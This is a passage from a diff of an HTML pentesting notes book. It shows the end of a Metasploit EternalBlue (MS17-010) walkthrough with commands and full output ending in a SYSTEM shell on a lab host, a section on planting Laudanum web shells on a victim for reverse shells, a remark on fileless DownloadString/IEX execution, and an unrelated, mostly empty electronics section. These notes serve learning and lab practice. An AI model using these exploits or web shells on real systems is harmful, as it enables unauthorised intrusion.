+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 4444
+
+# 8. Verify configuration
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+
+# 9. Check vulnerability (optional)
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; check
+
+# 10. Execute exploit
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
+</code></pre>
+<h3 id="expected-output-successful-exploit"><a class="header" href="#expected-output-successful-exploit">Expected Output (Successful Exploit)</a></h3>
+<pre><code>[*] Started reverse TCP handler on 10.10.14.15:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter&gt; shell
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<hr>
+<h2 id="key-takeaways"><a class="header" href="#key-takeaways">Key Takeaways</a></h2>
+<ol>
+<li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
+<li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
+<li><strong>Required Options</strong>: Always check <code>show options</code> to identify required settings before exploitation</li>
+<li><strong>Global vs Local</strong>: Use <code>setg</code> for options that should persist across modules (like <code>LHOST</code>), <code>set</code> for module-specific options</li>
+<li><strong>Check First</strong>: Use <code>check</code> command when available to verify vulnerability before attempting exploitation</li>
+<li><strong>Exploit Failures</strong>: A failed exploit doesn’t mean the vulnerability doesn’t exist - manual testing may be required</li>
+<li><strong>Rank Matters</strong>: Higher ranked exploits (excellent, great) are more reliable than lower ranked ones</li>
+</ol>
+<hr>
+<h2 id="best-practices-2"><a class="header" href="#best-practices-2">Best Practices</a></h2>
+<ol>
+<li><strong>Always verify targets</strong> before exploitation</li>
+<li><strong>Use check command</strong> when available to avoid unnecessary exploitation attempts</li>
+<li><strong>Set global options</strong> (<code>setg</code>) for values that won’t change (like <code>LHOST</code>)</li>
+<li><strong>Review module info</strong> (<code>info &lt;module&gt;</code>) for detailed descriptions and references</li>
+<li><strong>Test in lab environments</strong> before using in production assessments</li>
+<li><strong>Document your process</strong> - note which modules worked and which didn’t</li>
+<li><strong>Understand the exploit</strong> - don’t blindly run exploits without understanding what they do</li>
+</ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h1>
 <h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
@@ -24541,6 +25439,13 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nessus"><a href="#nessus" class="header">nessus</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
+<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
+<p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
+<p>Laudanum can be downloaded here: https://github.com/jbarcia/Web-Shells/tree/master/laudanum</p>
+<h2 id="using-laudanum"><a class="header" href="#using-laudanum">Using Laudanum</a></h2>
+<p>Laudanum files are typically stored in <code>/usr/share/laudanum/</code> on parrotos and kali. For most of the files, you can simply copy them to your web server’s root directory (e.g., <code>/var/www/html/</code> for Apache) and access them via a web browser. Some of the scripts require that you first modify them to add you own IP address for the reverse shell connection.</p>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
 <h2 id="introduction-30"><a class="header" href="#introduction-30">Introduction</a></h2>
 <p>Linux provides many versatile tools for file transfers. Understanding these methods helps both attackers and defenders. Most malware uses HTTP/HTTPS for communication, though Linux also supports FTP, SMB, and other protocols.</p>
@@ -24819,6 +25724,57 @@ ftp -v -n -s:ftpcommand.txt
 <li><strong>FTP</strong>: Alternative protocol, requires server setup</li>
 <li><strong>Fileless attacks</strong>: Use DownloadString + IEX to execute in memory without touching disk</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="electronics"><a class="header" href="#electronics">Electronics</a></h1>
+<ul>
+<li><a href="#ohms-law">Laws</a></li>
+<li><a href="#resistors">Resistors</a></li>
+<li><a href="#capacitors">Capacitors</a></li>
+<li><a href="#inductors">Inductors</a></li>
+<li><a href="#diodes">Diodes</a></li>
+<li><a href="#transistors">Transistors</a></li>
+<li><a href="#operational-amplifiers">Operational Amplifiers</a></li>
+<li><a href="#digital-logic-gates">Digital Logic Gates</a></li>
+<li><a href="#555-timer-ic">555 Timer IC</a></li>
+<li><a href="#microcontrollers">Microcontrollers</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ohms-law"><a class="header" href="#ohms-law">Ohms Law</a></h1>
+<p>Ohm’s Law is a fundamental principle in electronics that describes the relationship between voltage (V), current (I), and resistance (R) in an electrical circuit. It is mathematically expressed as:</p>
+<pre><code>V = IR (Voltage = current * resistance)
+</code></pre>
+<p>From this equation, we can derive the following formulas:</p>
+<pre><code>Current = V / R
+Resistance = V / I
+</code></pre>
+<p>Find the appropriate resistor size for a given voltage, forward voltage, and current (amperage):
+<em>Forward voltage can usually be found in the datasheet of the component being used (like an LED).</em></p>
+<pre><code>resistance = (supply_voltage - forward_voltage) / current
+</code></pre>
+<h5 id="example-led"><a class="header" href="#example-led">Example (LED):</a></h5>
+<p>Supply voltage: 9v battery
+Forward voltage: 5.2v
+Desired current: 20Ma (.02A)</p>
+<pre><code>(9 - 5.2) / .02 = 190 Ohms
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="resistors"><a class="header" href="#resistors">Resistors</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="capacitors"><a class="header" href="#capacitors">Capacitors</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="inductors"><a class="header" href="#inductors">Inductors</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="diodes"><a class="header" href="#diodes">Diodes</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="transistors"><a class="header" href="#transistors">Transistors</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="operational-amplifiers"><a class="header" href="#operational-amplifiers">Operational Amplifiers</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="digital-logic-gates"><a class="header" href="#digital-logic-gates">Digital Logic Gates</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="555-timer-ic"><a class="header" href="#555-timer-ic">555 Timer IC</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="microcontrollers"><a class="header" href="#microcontrollers">Microcontrollers</a></h1>
 
                     </main>
 
